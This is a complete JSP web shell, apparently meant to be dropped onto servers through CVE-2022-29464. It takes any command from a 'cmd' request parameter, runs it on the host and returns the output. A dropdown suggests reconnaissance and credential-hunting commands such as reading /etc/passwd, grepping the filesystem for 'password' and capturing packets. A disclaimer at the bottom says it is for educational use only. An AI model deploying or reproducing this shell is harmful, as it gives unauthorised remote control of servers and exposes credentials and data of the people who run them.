<!DOCTYPE html>
<html lang="en">
<%@ page import="java.io.*, java.util.*" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
  
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>[CVE 2022-29464]</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    integrity="sha512-GLSS+RxXn3w8kScKUAG2UfYVKGY5F7J3iwoPeBI+aJ7e9UZv5fXc6V4DDhme5lPdeNff/0h1a2qM4HUoFqdlPQ=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />
  <style>
    body {
      font-family: 'Roboto Mono', monospace;
      background: url('https://giffiles.alphacoders.com/209/209037.gif') center/cover no-repeat;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #a6a6a6;
      position: relative;
    }

    header {
      text-align: center;
      margin-bottom: 20px;
      font-size: 36px;
      background: linear-gradient(45deg, #ff0000, #ff9900, #33cc33, #0099cc, #9933cc, #ff3399);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
    }

    .social-buttons {
      position: absolute;
      top: 10px;
      right: 10px;
      display: flex;
      gap: 20px;
    }

    .social-button {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      overflow: hidden;
      background-color: #1a1a1a;
      transition: background-color 0.3s ease;
    }

    .social-button:hover {
      background-color: #333;
    }

    .social-button img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      cursor: pointer;
    }

    form {
      background-color: #1a1a1a;
      padding: 40px; /* Increased padding for a bigger rectangular box */
      border-radius: 40px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      transition: box-shadow 0.3s ease;
      text-align: center; /* Center the content within the box */
    }

    form:hover {
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
    }

    select {
      width: 100%;
      padding: 10px;
      margin-bottom: 18px;
      box-sizing: border-box;
      border: 1px solid #333;
      border-radius: 18px;
      background-color: #333;
      color: #fff;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 18px;
      box-sizing: border-box;
      border: 1px solid #333;
      border-radius: 18px;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      background-color: #55ccff;
      color: #fff;
      padding: 10px 100px; /* Reduced padding for a smaller button */
      border: none;
      border-radius: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    input[type="submit"]:hover {
      background-color: #34aaff;
    }

    p {
    
      margin-bottom: 40px;
      
    
    }

    /* Watermark */
    .watermark {
      position: absolute;
      bottom: 10px;
      right: 10px;
      font-size: 25px;
      color: rgba(255, 255, 255, 0.5);
    }

    /* Disclaimer */
    .disclaimer {
      position: absolute;
      bottom: 50px;
      left: 50%;
      transform: translateX(-50%);
      text-align: center;
      color: #fff;
      font-size: 18px;
    }
  </style>
</head>

<body>
  <header>
    <h1>[CVE 2022-29464]</h1>
  </header>

  <div class="social-buttons">
    <!-- GitHub button -->
    <div class="social-button">
      <a href="https://github.com/Pushkarup" target="_blank">
        <img src="https://pngimg.com/uploads/github/github_PNG58.png" alt="GitHub">
      </a>
    </div>
    <!-- LinkedIn button -->
    <div class="social-button">
      <a href="https://www.linkedin.com/in/pushkar-upadhyay" target="_blank">
        <img src="https://img.icons8.com/color/48/000000/linkedin.png" alt="LinkedIn">
      </a>
    </div>
  </div>

  <form method="GET" name="myform" action="">
    <select>
      <option value="ls">List files</option>
      <option value="pwd">Print working directory</option>
      <option value="whoami">Display current user</option>
      <option value="uname -a">Display system information</option>
      <option value="ps aux">Retrieve a list of running processes</option>
      <option value="netstat -an">Check network connections</option>
      <option value="cat /etc/passwd">Dump all user accounts</option>
      <option value="find / -name 'password' -type f">Search for password files</option>
      <option value="ls /etc/*.conf">List configuration files</option>
      <option value="find / -type f -perm -o+w">Find world-writable files</option>
      <option value="who">Show logged-in users</option>
      <option value="df -h">Display disk space usage</option>
      <option value="ls /var/log">List log files</option>
      <option value="cat /etc/hosts">View the hosts file</option>
      <option value="lsblk">List block devices</option>
      <option value="netstat -tuln">List all open ports and associated processes</option>
      <option value="ss -tuln">Display listening sockets with process information</option>
      <option value="nmap -p- localhost">Scan all ports on the localhost</option>
      <option value="lsof -i">List all open files (including network connections)</option>
      <option value="nmap localhost">Perform a detailed port scan on localhost</option>
      <option value="ss -s">Display socket statistics</option>
      <option value="sudo lsof -i -P -n">List all open files with network information (requires sudo)</option>
      <option value="sudo ufw status">Check the status of the Uncomplicated Firewall (UFW)</option>
      <option value="cat /etc/services">List known port assignments</option>
      <option value="tcpdump -i any">Capture network packets on all interfaces</option>
      <option value="journalctl">View system logs using journalctl</option>
      <option value="find / -type f -exec grep -i 'password' {} +">Search for files containing 'password'</option>
      <option value="curl ifconfig.me">Get your public IP address using ifconfig.me</option>
      <option value="chkconfig --list">List all services managed by chkconfig</option>
      <option value="tar -czvf backup.tar.gz /path/to/backup">Create a compressed backup of a directory</option>

      <!-- Add more predefined lines as needed -->
    </select>
    <br>
    <input type="text" name="cmd" placeholder="Enter your command">
    <br>
    <input type="submit" value="Send">
  </form>
  <pre>
<%
try {
    if (request.getParameter("cmd") != null) {
        out.println("<pre>");

        // Print Command Information
        out.println("[CVE 2023-29464]/Command: " + request.getParameter("cmd") + "<BR>");

        Process p;
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
            p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
        } else {
            p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        }

        // Input and Output Streams
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        InputStreamReader isr = new InputStreamReader(in, StandardCharsets.UTF_8);
        BufferedReader br = new BufferedReader(isr);

        // Reading and Printing Output
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }

        out.println("</pre>");
    }
} catch (IOException e) {
    out.println("<pre>Error: " + e.getMessage() + "</pre>");
    e.printStackTrace();
}
%>

    </pre>

  <!-- Watermark -->
  <div class="watermark">Coded by PUSHKAR UPADHYAY</div>

  <!-- Disclaimer -->
  <div class="disclaimer">
    <p style="text-align: center; margin: 0;">
      This webshell is provided for educational purposes only. It is intended to be used in a controlled environment where the user has obtained proper authorization and is compliant with all applicable laws and ethical standards.
    </p>
  </div>
</body>

</html>